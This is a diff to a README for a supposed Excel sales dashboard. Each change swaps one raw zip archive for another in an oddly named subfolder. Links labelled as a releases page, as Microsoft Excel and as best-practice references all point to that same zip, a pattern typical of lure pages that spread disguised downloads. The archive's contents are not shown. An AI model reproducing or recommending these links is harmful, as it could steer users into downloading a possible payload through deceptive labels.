@@ -1,6 +1,6 @@
 # 📊 Excel_Sales_Performance_Dashboard_2024 - Simplify Your Sales Analysis 
 
-[![Download Now](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)
+[![Download Now](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide helps you download and run the Excel Sales Performance Dashb
 
 To get started, visit the Releases page to download the Excel Sales Performance Dashboard.
 
-[Visit the Releases Page to Download](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)
+[Visit the Releases Page to Download](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)
 
 ### System Requirements
 
@@ -73,13 +73,13 @@ For tips on data analysis and effective dashboard use, consider checking out:
 
 ## 🔗 References
 
-- [Microsoft Excel](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)
-- [Sales Analytics Best Practices](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)
+- [Microsoft Excel](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)
+- [Sales Analytics Best Practices](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)
 
 ## 📥 Download the Dashboard Again
 
 If you need to download the dashboard again, you can find it here:
 
-[Visit the Releases Page to Download](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel-Dashboard-Sales-Performance-3.3.zip)
+[Visit the Releases Page to Download](https://github.com/papawin91144/Excel_Sales_Performance_Dashboard_2024/raw/refs/heads/main/ecalcarate/Excel_Performance_Dashboard_Sales_3.0-alpha.1.zip)
 
 Thank you for using the Excel Sales Performance Dashboard! Happy analyzing!
